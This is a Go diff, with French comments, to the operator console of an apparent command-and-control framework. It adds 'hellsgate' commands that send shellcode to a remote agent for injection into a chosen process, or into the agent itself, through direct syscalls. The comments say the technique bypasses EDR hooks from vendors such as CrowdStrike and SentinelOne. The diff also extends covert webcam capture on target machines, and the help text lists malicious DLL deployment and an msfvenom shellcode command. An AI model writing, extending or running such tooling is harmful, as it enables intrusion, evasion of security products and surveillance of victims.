@@ -52,7 +52,8 @@ func NewConsole(apiBase string) *Console {
 	return &Console{
 		APIBase: apiBase,
 		reader:  bufio.NewReader(os.Stdin),
-		client:  &http.Client{Timeout: 30 * time.Second},
+		// Timeout 90s pour supporter le poll webcam (capture peut prendre ~60s)
+		client: &http.Client{Timeout: 90 * time.Second},
 	}
 }
 
@@ -186,6 +187,16 @@ func (c *Console) handleCommand(cmd string, args []string) error {
 			return fmt.Errorf("usage: hijack_deploy <chemin_local_vers_dll>")
 		}
 		return c.cmdHijackDeploy(args[0])
+	case "hellsgate":
+		if c.ActiveAgent == "" || len(args) < 2 {
+			return fmt.Errorf("usage: hellsgate <pid> <chemin_shellcode_local>")
+		}
+		return c.cmdHellsGate(args[0], args[1])
+	case "hellsgate_local":
+		if c.ActiveAgent == "" || len(args) == 0 {
+			return fmt.Errorf("usage: hellsgate_local <chemin_shellcode_local>")
+		}
+		return c.cmdHellsGateLocal(args[0])
 	case "webcam":
 		if c.ActiveAgent == "" {
 			return fmt.Errorf("aucun agent sélectionné")
@@ -350,18 +361,69 @@ func (c *Console) cmdHijackDeploy(dllPath string) error {
 	}
 
 	encoded := base64.StdEncoding.EncodeToString(data)
-	
+
 	fmt.Printf("[*] Envoi de la DLL (%d bytes)...", len(data))
 	return c.cmdTask("hijack_deploy", encoded)
+}
+
+// cmdHellsGate — injection distante via direct syscalls (Hell's Gate)
+//
+// Lit un fichier shellcode .bin local, l'encode en base64,
+// et l'envoie à l'agent avec le PID cible.
+// L'agent résoudra les SSN dynamiquement et exécutera les syscalls
+// directement sans passer par les hooks EDR de ntdll.dll.
+func (c *Console) cmdHellsGate(pidStr, shellcodePath string) error {
+	// Vérifier le PID
+	if _, err := fmt.Sscanf(pidStr, "%s", &pidStr); err != nil {
+		return fmt.Errorf("PID invalide: %s", pidStr)
+	}
+
+	// Lire le shellcode depuis le fichier local
+	data, err := os.ReadFile(shellcodePath)
+	if err != nil {
+		return fmt.Errorf("impossible de lire le shellcode: %v", err)
+	}
+
+	// Encoder en base64 et construire le payload : "pid:base64_shellcode"
+	encoded := base64.StdEncoding.EncodeToString(data)
+	payload := fmt.Sprintf("%s:%s", pidStr, encoded)
+
+	fmt.Printf("[*] Hell's Gate — Injection directe via syscalls\n")
+	fmt.Printf("    PID cible    : %s\n", pidStr)
+	fmt.Printf("    Shellcode    : %s (%d bytes)\n", shellcodePath, len(data))
+	fmt.Printf("    Technique    : Direct syscalls (bypass hooks ntdll)\n")
+	fmt.Printf("[*] Envoi de la tâche...\n")
+
+	return c.cmdTask("hellsgate", payload)
+}
+
+// cmdHellsGateLocal — self-injection via direct syscalls
+//
+// Exécute le shellcode dans le processus de l'agent lui-même.
+// Utile pour charger un reflective DLL loader ou un beacon second-stage.
+func (c *Console) cmdHellsGateLocal(shellcodePath string) error {
+	data, err := os.ReadFile(shellcodePath)
+	if err != nil {
+		return fmt.Errorf("impossible de lire le shellcode: %v", err)
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(data)
+
+	fmt.Printf("[*] Hell's Gate — Self-injection via syscalls directs\n")
+	fmt.Printf("    Shellcode : %s (%d bytes)\n", shellcodePath, len(data))
+	fmt.Printf("    Cible     : Processus agent (self-inject)\n")
+	fmt.Printf("[*] Envoi de la tâche...\n")
+
+	return c.cmdTask("hellsgate_local", encoded)
 }
 
 // cmdWebcam — demande une capture webcam à l'agent et sauvegarde le JPEG localement
 //
 // Flux :
-//   1. Envoie la tâche "webcam_snap" à l'agent
-//   2. Poll le résultat (timeout 60s — la capture peut prendre du temps)
-//   3. Si succès : décode le base64 JPEG et sauvegarde en fichier local
-//   4. Si échec : affiche les défenses Windows détectées par l'agent
+//  1. Envoie la tâche "webcam_snap" à l'agent
+//  2. Poll le résultat (timeout 60s — la capture peut prendre du temps)
+//  3. Si succès : décode le base64 JPEG et sauvegarde en fichier local
+//  4. Si échec : affiche les défenses Windows détectées par l'agent
 func (c *Console) cmdWebcam() error {
 	fmt.Println("[*] Envoi de la tâche webcam_snap à l'agent...")
 	fmt.Println("[!] Note : la LED de la webcam s'allumera sur la machine cible")
@@ -375,12 +437,13 @@ func (c *Console) cmdWebcam() error {
 	if len(shortID) > 8 {
 		shortID = shortID[:8]
 	}
-	fmt.Printf("[+] Tâche webcam_snap créée [%s] — attente résultat (timeout 60s)...\n", shortID)
+	fmt.Printf("[+] Tâche webcam_snap créée [%s] — attente résultat (timeout 90s)...\n", shortID)
 
-	// Poll avec timeout étendu (60s) car la capture webcam prend du temps
+	// Poll avec timeout étendu (90s) car la capture webcam peut prendre du temps
+	// (initialisation COM/WMF + warm-up de la webcam + encodage JPEG)
 	result := c.pollWebcamResult(taskID)
 	if result == "" {
-		return fmt.Errorf("timeout : l'agent n'a pas retourné de résultat dans les 60 secondes")
+		return fmt.Errorf("timeout : l'agent n'a pas retourné de résultat dans les 90 secondes")
 	}
 
 	// Parser le résultat
@@ -443,10 +506,23 @@ func (c *Console) cmdWebcam() error {
 	return nil
 }
 
-// pollWebcamResult — poll spécialisé avec timeout 60s pour la capture webcam
+// pollWebcamResult — poll spécialisé avec timeout 90s pour la capture webcam
+//
+// La capture webcam peut prendre jusqu'à ~60s sur certains systèmes :
+//   - Initialisation COM/MF (quelques secondes)
+//   - Warm-up de la webcam (frames noirs ignorés)
+//   - Encodage JPEG WIC
+//   - Chiffrement AES + beacon retour
 func (c *Console) pollWebcamResult(taskID string) string {
-	for i := 0; i < 60; i++ {
+	const maxAttempts = 90
+	for i := 0; i < maxAttempts; i++ {
 		time.Sleep(1 * time.Second)
+
+		// Afficher la progression toutes les 10 secondes
+		if i > 0 && i%10 == 0 {
+			fmt.Printf("[*] En attente de la réponse webcam... %ds/%ds\n", i, maxAttempts)
+		}
+
 		var result map[string]interface{}
 		if err := c.apiGet("/api/agents/"+c.ActiveAgent+"/tasks", &result); err != nil {
 			continue
@@ -721,14 +797,22 @@ func (c *Console) printHelp() {
     tasks               Historique des tâches
     interactive         Mode shell pseudo-interactif (sleep 1s)
     kill                Terminer l'agent
+
+  DLL Hijacking :
     hijack_scan         Rechercher des cibles de DLL hijacking
     hijack_deploy <dll> Déployer une DLL malveillante
+
+  Hell's Gate (Direct Syscalls) :
+    hellsgate <pid> <shellcode.bin>     Injection distante via syscalls directs
+    hellsgate_local <shellcode.bin>     Self-injection via syscalls directs
 
   Tips :
     - Les IDs peuvent être abrégés (8 premiers caractères)
     - Les tâches sont asynchrones — l'agent les récupère au prochain beacon
     - Utiliser 'tasks' pour voir les résultats
     - 'webcam' sauvegarde automatiquement le JPEG dans le répertoire courant
+    - Hell's Gate bypass les hooks ntdll des EDR (CrowdStrike, SentinelOne...)
+    - Générer un shellcode : msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin
 `
 	fmt.Println(help)
 
